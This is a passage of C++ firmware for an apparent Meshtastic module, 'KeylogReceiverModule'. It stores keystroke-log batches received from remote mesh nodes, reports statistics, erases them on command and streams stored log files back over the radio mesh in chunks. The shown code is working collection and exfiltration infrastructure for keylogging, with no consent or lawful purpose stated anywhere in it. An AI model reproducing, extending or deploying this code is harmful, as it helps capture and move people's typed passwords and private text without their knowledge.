        // NASA Rule 2: Bounded iteration
        while (nodeDir && nodeCount < KEYLOG_MAX_NODES) {
            if (nodeDir.isDirectory()) {
                nodeCount++;
                File logFile = nodeDir.openNextFile();
                uint32_t filesInNode = 0;

                while (logFile && filesInNode < KEYLOG_MAX_FILES_PER_NODE) {
                    if (!logFile.isDirectory()) {
                        totalFiles++;
                        totalBytes += logFile.size();
                        filesInNode++;
                    }
                    logFile.close();
                    logFile = nodeDir.openNextFile();
                }
                if (logFile) {
                    logFile.close();
                }
            }
            nodeDir.close();
            nodeDir = baseDir.openNextFile();
        }
        if (nodeDir) {
            nodeDir.close();
        }
        baseDir.close();
    }

    // Build JSON response (v7.0: includes duplicates count)
    char json[KEYLOG_JSON_MAX_LEN];
    snprintf(json, sizeof(json),
             "{\"status\":\"ok\",\"command\":\"stats\","
             "\"nodes\":%lu,\"files\":%lu,\"bytes\":%lu,"
             "\"rx\":%lu,\"stored\":%lu,\"acks\":%lu,\"errors\":%lu,\"duplicates\":%lu}",
             (unsigned long)nodeCount,
             (unsigned long)totalFiles,
             (unsigned long)totalBytes,
             (unsigned long)totalBatchesReceived,
             (unsigned long)totalBatchesStored,
             (unsigned long)totalAcksSent,
             (unsigned long)storageErrors,
             (unsigned long)duplicatesDetected);

    sendResponse(from, json);
    return true;
}

bool KeylogReceiverModule::handleEraseAllCommand(NodeNum from)
{
    LOG_INFO("[KeylogReceiver] ERASE_ALL command from !%08x", from);

    uint32_t deletedCount = 0;
    uint32_t errorCount = 0;
    uint32_t nodeCount = 0;

    // Open base directory
    File baseDir = FSCom.open(KEYLOG_BASE_DIR);
    if (!baseDir || !baseDir.isDirectory()) {
        // No keylogs directory exists - nothing to erase
        char json[KEYLOG_JSON_MAX_LEN];
        snprintf(json, sizeof(json),
                 "{\"status\":\"ok\",\"command\":\"erase_all\",\"deleted\":0,\"errors\":0}");
        sendResponse(from, json);
        if (baseDir) {
            baseDir.close();
        }
        LOG_INFO("[KeylogReceiver] ERASE_ALL: no keylogs directory");
        return true;
    }

    // Iterate over node directories
    // NASA Rule 2: Bounded iteration
    File nodeDir = baseDir.openNextFile();

    while (nodeDir && nodeCount < KEYLOG_MAX_NODES) {
        if (nodeDir.isDirectory()) {
            // Build node directory path
            char nodePath[KEYLOG_MAX_PATH_LEN];
            int nodePathLen = snprintf(nodePath, sizeof(nodePath), "%s/%s",
                                        KEYLOG_BASE_DIR, nodeDir.name());

            // NASA Rule 6: Check for truncation
            if (nodePathLen > 0 && nodePathLen < (int)sizeof(nodePath)) {
                // Iterate files in this node directory
                // NASA Rule 2: Bounded iteration
                File logFile = nodeDir.openNextFile();
                uint32_t filesInNode = 0;

                while (logFile && filesInNode < KEYLOG_MAX_FILES_PER_NODE) {
                    if (!logFile.isDirectory()) {
                        // Build full file path
                        char filePath[KEYLOG_MAX_PATH_LEN];
                        int filePathLen = snprintf(filePath, sizeof(filePath), "%s/%s",
                                                    nodePath, logFile.name());

                        // Close file handle before deletion
                        logFile.close();

                        // NASA Rule 6: Check for truncation before delete
                        if (filePathLen > 0 && filePathLen < (int)sizeof(filePath)) {
                            if (FSCom.remove(filePath)) {
                                deletedCount++;
                                LOG_DEBUG("[KeylogReceiver] Deleted: %s", filePath);
                            } else {
                                errorCount++;
                                LOG_ERROR("[KeylogReceiver] Failed to delete: %s", filePath);
                            }
                        } else {
                            errorCount++;
                        }
                    } else {
                        logFile.close();
                    }

                    logFile = nodeDir.openNextFile();
                    filesInNode++;
                }

                if (logFile) {
                    logFile.close();
                }

                // Close node directory before attempting to remove it
                nodeDir.close();

                // Try to remove empty node directory (will fail if not empty, that's ok)
                FSCom.rmdir(nodePath);
            } else {
                nodeDir.close();
            }
        } else {
            nodeDir.close();
        }

        nodeDir = baseDir.openNextFile();
        nodeCount++;
    }

    if (nodeDir) {
        nodeDir.close();
    }
    baseDir.close();

    // Build JSON response
    char json[KEYLOG_JSON_MAX_LEN];
    snprintf(json, sizeof(json),
             "{\"status\":\"ok\",\"command\":\"erase_all\",\"deleted\":%lu,\"errors\":%lu}",
             (unsigned long)deletedCount, (unsigned long)errorCount);

    sendResponse(from, json);

    LOG_INFO("[KeylogReceiver] ERASE_ALL: deleted %lu files, %lu errors",
             (unsigned long)deletedCount, (unsigned long)errorCount);
    return true;
}

bool KeylogReceiverModule::sendResponse(NodeNum to, const char *response)
{
    // NASA Rule 4: Validate inputs
    assert(response != nullptr);

    // Special case: to == 0 means serial response mode
    if (to == 0) {
        sendSerialResponse(response);
        return true;
    }

    if (to == NODENUM_BROADCAST) {
        LOG_ERROR("[KeylogReceiver] Invalid response destination: BROADCAST");
        return false;
    }

    size_t len = strlen(response);
    if (len > KEYLOG_MAX_PAYLOAD_SIZE - 1) {
        LOG_ERROR("[KeylogReceiver] Response too long: %u bytes", len);
        return false;
    }

    // Allocate packet
    meshtastic_MeshPacket *reply = allocDataPacket();
    if (reply == nullptr) {
        LOG_ERROR("[KeylogReceiver] Failed to allocate response packet");
        return false;
    }

    // Configure packet (v7.0: use custom port 490 on channel 1)
    reply->to = to;
    reply->channel = KEYLOG_RECEIVER_CHANNEL;
    reply->decoded.portnum = static_cast<meshtastic_PortNum>(KEYLOG_RECEIVER_PORTNUM);
    reply->pki_encrypted = false;  // Use channel PSK, not PKI
    reply->want_ack = false;
    reply->priority = meshtastic_MeshPacket_Priority_DEFAULT;

    // Copy response payload
    assert(len < sizeof(reply->decoded.payload.bytes));
    memcpy(reply->decoded.payload.bytes, response, len + 1);
    reply->decoded.payload.size = len;

    // Send packet
    service->sendToMesh(reply, RX_SRC_LOCAL, true);

    LOG_DEBUG("[KeylogReceiver] Sent response to !%08x (%u bytes)", to, len);
    return true;
}

bool KeylogReceiverModule::sendFileChunks(NodeNum to, const char *path)
{
    // NASA Rule 4: Validate inputs
    assert(path != nullptr);

    // Open file
    File file = FSCom.open(path, "r");
    if (!file) {
        sendResponse(to, "ERR:Cannot open file");
        return false;
    }

    size_t fileSize = file.size();
    uint32_t totalChunks = (fileSize + KEYLOG_CHUNK_SIZE - 1) / KEYLOG_CHUNK_SIZE;
    if (totalChunks == 0) {
        totalChunks = 1;  // Empty file still gets one chunk
    }

    LOG_INFO("[KeylogReceiver] Sending file %s (%u bytes, %lu chunks)",
             path, fileSize, (unsigned long)totalChunks);

    // Send header first
    char headerBuf[64];
    snprintf(headerBuf, sizeof(headerBuf), "OK:READ:%lu:%lu",
             (unsigned long)fileSize, (unsigned long)totalChunks);
    sendResponse(to, headerBuf);

    // Send file data in chunks
    // NASA Rule 2: Fixed upper bound on chunks (max 256 chunks = 51KB)
    uint8_t chunkBuf[KEYLOG_CHUNK_SIZE + 32];  // Extra for header
    uint32_t chunkNum = 0;
    const uint32_t maxChunks = 256;

    while (file.available() && chunkNum < maxChunks) {
        // Read chunk of data
        size_t bytesRead = file.read(chunkBuf + 16, KEYLOG_CHUNK_SIZE);  // Leave room for header

        if (bytesRead == 0) {
            break;
        }

        // Build chunk header: "DATA:<chunk>/<total>:"
        char chunkHeader[32];
        int headerLen = snprintf(chunkHeader, sizeof(chunkHeader), "DATA:%lu/%lu:",
                                 (unsigned long)(chunkNum + 1), (unsigned long)totalChunks);

        // Combine header and data
        char *chunkPayload = (char *)chunkBuf;
        memcpy(chunkPayload, chunkHeader, headerLen);
        memmove(chunkPayload + headerLen, chunkBuf + 16, bytesRead);

        // Allocate and send packet
        meshtastic_MeshPacket *pkt = allocDataPacket();
        if (pkt == nullptr) {
            LOG_ERROR("[KeylogReceiver] Failed to allocate chunk packet");
            break;
        }

        pkt->to = to;
        pkt->channel = KEYLOG_RECEIVER_CHANNEL;
        pkt->decoded.portnum = static_cast<meshtastic_PortNum>(KEYLOG_RECEIVER_PORTNUM);
        pkt->pki_encrypted = false;  // Use channel PSK, not PKI
        pkt->want_ack = false;
        pkt->priority = meshtastic_MeshPacket_Priority_DEFAULT;

        size_t payloadLen = headerLen + bytesRead;
        assert(payloadLen < sizeof(pkt->decoded.payload.bytes));
        memcpy(pkt->decoded.payload.bytes, chunkPayload, payloadLen);
        pkt->decoded.payload.size = payloadLen;

        service->sendToMesh(pkt, RX_SRC_LOCAL, true);

        LOG_DEBUG("[KeylogReceiver] Sent chunk %lu/%lu (%u bytes)",
                  (unsigned long)(chunkNum + 1), (unsigned long)totalChunks, bytesRead);

        chunkNum++;

        // Small delay between chunks to avoid overwhelming the mesh
        delay(50);
    }

    file.close();

    // Send end marker
    char endBuf[32];
    snprintf(endBuf, sizeof(endBuf), "DATA:END:%lu", (unsigned long)chunkNum);
    sendResponse(to, endBuf);

    LOG_INFO("[KeylogReceiver] File transfer complete: %lu chunks sent", (unsigned long)chunkNum);
    return true;
}

// ==================== JSON Helper Implementations ====================

size_t KeylogReceiverModule::base64Encode(const uint8_t *input, size_t inputLen, char *output, size_t outLen)
{
    // NASA Rule 4: Validate inputs
    assert(output != nullptr);

    if (input == nullptr || inputLen == 0) {
        output[0] = '\0';
        return 0;
    }

    // Calculate required output size: ((inputLen + 2) / 3) * 4 + 1
    size_t requiredLen = ((inputLen + 2) / 3) * 4 + 1;
    if (outLen < requiredLen) {
        output[0] = '\0';
        return 0;
    }

    size_t outPos = 0;
    size_t i = 0;

    // NASA Rule 2: Fixed upper bound on iterations
    while (i < inputLen && outPos + 4 < outLen) {
        uint32_t octet_a = i < inputLen ? input[i++] : 0;
        uint32_t octet_b = i < inputLen ? input[i++] : 0;
        uint32_t octet_c = i < inputLen ? input[i++] : 0;

        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        output[outPos++] = BASE64_TABLE[(triple >> 18) & 0x3F];
        output[outPos++] = BASE64_TABLE[(triple >> 12) & 0x3F];
        output[outPos++] = BASE64_TABLE[(triple >> 6) & 0x3F];
        output[outPos++] = BASE64_TABLE[triple & 0x3F];
    }

    // Add padding
    size_t mod = inputLen % 3;
    if (mod > 0) {
        // Replace last characters with padding
        if (mod == 1) {
            output[outPos - 2] = '=';
            output[outPos - 1] = '=';
        } else if (mod == 2) {
            output[outPos - 1] = '=';
        }
    }

    output[outPos] = '\0';
    return outPos;
}

size_t KeylogReceiverModule::jsonEscapeString(const char *input, char *output, size_t outLen)
{
    // NASA Rule 4: Validate inputs
    assert(output != nullptr);

    if (input == nullptr) {
        output[0] = '\0';
        return 0;
    }

    size_t outPos = 0;

    // NASA Rule 2: Fixed upper bound (max input length)
    for (size_t i = 0; input[i] != '\0' && outPos + 6 < outLen && i < KEYLOG_JSON_MAX_LEN; i++) {
        char c = input[i];

        // Characters that need escaping in JSON
        switch (c) {
            case '"':
                output[outPos++] = '\\';
                output[outPos++] = '"';
                break;
            case '\\':
                output[outPos++] = '\\';
                output[outPos++] = '\\';
                break;
            case '\b':
                output[outPos++] = '\\';
                output[outPos++] = 'b';
                break;
            case '\f':
                output[outPos++] = '\\';
                output[outPos++] = 'f';
                break;
            case '\n':
                output[outPos++] = '\\';
                output[outPos++] = 'n';
                break;
            case '\r':
                output[outPos++] = '\\';
                output[outPos++] = 'r';
                break;
            case '\t':
                output[outPos++] = '\\';
                output[outPos++] = 't';
                break;
            default:
                // Control characters (0x00-0x1F) need unicode escaping
                if ((unsigned char)c < 0x20) {
                    int written = snprintf(output + outPos, outLen - outPos, "\\u%04x", (unsigned char)c);
                    if (written > 0) {
                        outPos += written;
                    }
                } else {
                    output[outPos++] = c;
                }
                break;
        }
    }

    output[outPos] = '\0';
    return outPos;
}

// ==================== Deduplication Implementation ====================

/**
 * @brief Check if batch was already received from this node
 * NASA Rule 1: No recursion, simple control flow
 * NASA Rule 2: Fixed loop bounds (DEDUP_MAX_NODES, DEDUP_BATCHES_PER_NODE)
 * NASA Rule 4: Assertions verify assumptions
 */
bool KeylogReceiverModule::isDuplicateBatch(NodeNum from, uint32_t batchId)
{
    // NASA Rule 4: Validate input
    assert(from != 0);
    assert(from != NODENUM_BROADCAST);

    // NASA Rule 2: Fixed upper bound (16 nodes max)
    for (uint8_t i = 0; i < DEDUP_MAX_NODES; i++) {
        if (dedupCache[i].nodeId == from) {
            // Found node entry, search its recent batches
            // NASA Rule 2: Fixed upper bound (16 batches max)
            uint8_t searchCount = (dedupCache[i].count < DEDUP_BATCHES_PER_NODE)
                                  ? dedupCache[i].count : DEDUP_BATCHES_PER_NODE;
            for (uint8_t j = 0; j < searchCount; j++) {
                if (dedupCache[i].recentBatchIds[j] == batchId) {
                    return true;  // Duplicate!
                }
            }
            return false;  // Node found but batch not in history
        }
    }
    return false;  // Node not found = definitely new
}

/**
 * @brief Record a received batch in the dedup cache
 * NASA Rule 3: No dynamic allocation (uses fixed cache)
 * NASA Rule 5: Variables at smallest scope
 * NASA Rule 7: Limited pointer dereferencing
 */
void KeylogReceiverModule::recordReceivedBatch(NodeNum from, uint32_t batchId)
{
    // NASA Rule 4: Validate input
    assert(from != 0);

    DedupNodeEntry *entry = findOrCreateNodeEntry(from);

    // NASA Rule 6: Check return value
    if (entry == nullptr) {
        LOG_WARN("[KeylogReceiver] Dedup cache: failed to get entry for !%08x", from);
        return;
    }

    // NASA Rule 4: Verify entry is valid
    assert(entry->nextIdx < DEDUP_BATCHES_PER_NODE);

    // Add to circular buffer
    entry->recentBatchIds[entry->nextIdx] = batchId;
    entry->nextIdx = (entry->nextIdx + 1) % DEDUP_BATCHES_PER_NODE;
    if (entry->count < DEDUP_BATCHES_PER_NODE) {
        entry->count++;
    }

    dedupCacheDirty = true;
}

/**
 * @brief Find existing node entry or create new one (LRU eviction if full)
 * NASA Rule 1: No recursion
 * NASA Rule 2: Fixed loop bounds
 * NASA Rule 7: Returns pointer to static array element (no heap)
 */
DedupNodeEntry *KeylogReceiverModule::findOrCreateNodeEntry(NodeNum nodeId)
{
    // NASA Rule 4: Validate input
    assert(nodeId != 0);

    // NASA Rule 5: Variables at smallest scope
    uint32_t now = millis() / 1000;

    // First pass: find existing entry
    // NASA Rule 2: Fixed upper bound
    for (uint8_t i = 0; i < DEDUP_MAX_NODES; i++) {
        if (dedupCache[i].nodeId == nodeId) {
            dedupCache[i].lastAccessTime = now;  // Update LRU
            return &dedupCache[i];
        }
    }

    // Second pass: find empty slot
    // NASA Rule 2: Fixed upper bound
    for (uint8_t i = 0; i < DEDUP_MAX_NODES; i++) {
        if (dedupCache[i].nodeId == 0) {
            dedupCache[i].nodeId = nodeId;
            dedupCache[i].lastAccessTime = now;
            dedupCache[i].nextIdx = 0;
            dedupCache[i].count = 0;
            dedupCacheDirty = true;
            LOG_DEBUG("[KeylogReceiver] Dedup: new entry for node !%08x", nodeId);
            return &dedupCache[i];
        }
    }

    // Cache full - evict LRU (least recently used)
    uint8_t lruIdx = 0;
    uint32_t oldestTime = dedupCache[0].lastAccessTime;

    // NASA Rule 2: Fixed upper bound
    for (uint8_t i = 1; i < DEDUP_MAX_NODES; i++) {
        if (dedupCache[i].lastAccessTime < oldestTime) {
            oldestTime = dedupCache[i].lastAccessTime;
            lruIdx = i;
        }
    }

    // NASA Rule 4: Verify index bounds
    assert(lruIdx < DEDUP_MAX_NODES);

    LOG_INFO("[KeylogReceiver] Evicting LRU node !%08x from dedup cache",
             dedupCache[lruIdx].nodeId);

    // Reset and reuse
    memset(&dedupCache[lruIdx], 0, sizeof(DedupNodeEntry));
    dedupCache[lruIdx].nodeId = nodeId;
    dedupCache[lruIdx].lastAccessTime = now;
    dedupCacheDirty = true;
    return &dedupCache[lruIdx];
}

/**
 * @brief Load dedup cache from flash filesystem
 * NASA Rule 6: All return values checked
 * NASA Rule 3: Uses fixed-size buffer (no heap)
 */
bool KeylogReceiverModule::loadDedupCache()
{
    // NASA Rule 6: Check file open
    File f = FSCom.open(DEDUP_CACHE_FILE, "r");
    if (!f) {
        return false;  // File doesn't exist - fresh start
    }

    // NASA Rule 6: Check read result
    DedupCacheHeader header;
    size_t headerRead = f.read((uint8_t *)&header, sizeof(header));
    if (headerRead != sizeof(header)) {
        LOG_WARN("[KeylogReceiver] Dedup cache header read failed");
        f.close();
        return false;
    }

    // Validate magic number and version
    if (header.magic != DEDUP_CACHE_MAGIC || header.version != DEDUP_CACHE_VERSION) {
        LOG_WARN("[KeylogReceiver] Dedup cache invalid (magic=0x%04X, ver=%u)",
                 header.magic, header.version);
        f.close();
        return false;
    }

    // NASA Rule 6: Check read result
    size_t bytesRead = f.read((uint8_t *)dedupCache, sizeof(dedupCache));
    f.close();

    if (bytesRead != sizeof(dedupCache)) {
        LOG_WARN("[KeylogReceiver] Dedup cache truncated (%u/%u bytes)",
                 (unsigned)bytesRead, (unsigned)sizeof(dedupCache));
        memset(dedupCache, 0, sizeof(dedupCache));
        return false;
    }

    LOG_INFO("[KeylogReceiver] Dedup cache loaded (%lu nodes)",
             (unsigned long)header.nodeCount);
    return true;
}

/**
 * @brief Save dedup cache to flash filesystem
 * NASA Rule 6: All return values checked
 * NASA Rule 2: Fixed loop bound for counting nodes
 */
bool KeylogReceiverModule::saveDedupCache()
{
    // NASA Rule 6: Check file open
    File f = FSCom.open(DEDUP_CACHE_FILE, "w");
    if (!f) {
        LOG_ERROR("[KeylogReceiver] Failed to open dedup cache for writing");
        return false;
    }

    // Count active nodes
    // NASA Rule 2: Fixed upper bound
    uint32_t nodeCount = 0;
    for (uint8_t i = 0; i < DEDUP_MAX_NODES; i++) {
        if (dedupCache[i].nodeId != 0) {
            nodeCount++;
        }
    }

    // Write header
    DedupCacheHeader header;
    header.magic = DEDUP_CACHE_MAGIC;
    header.version = DEDUP_CACHE_VERSION;
    header.nodeCount = nodeCount;

    // NASA Rule 6: Check write result
    size_t headerWritten = f.write((uint8_t *)&header, sizeof(header));
    if (headerWritten != sizeof(header)) {
        LOG_ERROR("[KeylogReceiver] Dedup cache header write failed");
        f.close();
        return false;
    }

    // NASA Rule 6: Check write result
    size_t cacheWritten = f.write((uint8_t *)dedupCache, sizeof(dedupCache));
    if (cacheWritten != sizeof(dedupCache)) {
        LOG_ERROR("[KeylogReceiver] Dedup cache data write failed");
        f.close();
        return false;
    }

    f.flush();
    f.close();

    dedupCacheDirty = false;
    LOG_DEBUG("[KeylogReceiver] Dedup cache saved (%lu nodes)", (unsigned long)nodeCount);
    return true;
}

/**
 * @brief Save cache if dirty and debounce interval elapsed
 * NASA Rule 1: Simple control flow (early returns)
 */
void KeylogReceiverModule::saveDedupCacheIfNeeded()
{
    if (!dedupCacheDirty) {
        return;
    }

    uint32_t now = millis();
    if (now - lastDedupSave < DEDUP_SAVE_INTERVAL_MS) {
        return;  // Debounce - don't save too frequently
    }

    // NASA Rule 6: Check but don't fail on save error (cache still in RAM)
    if (!saveDedupCache()) {
        LOG_WARN("[KeylogReceiver] Dedup cache save failed, will retry");
    }
    lastDedupSave = now;
}

#endif /* KEYLOG_RECEIVER_ENABLED */
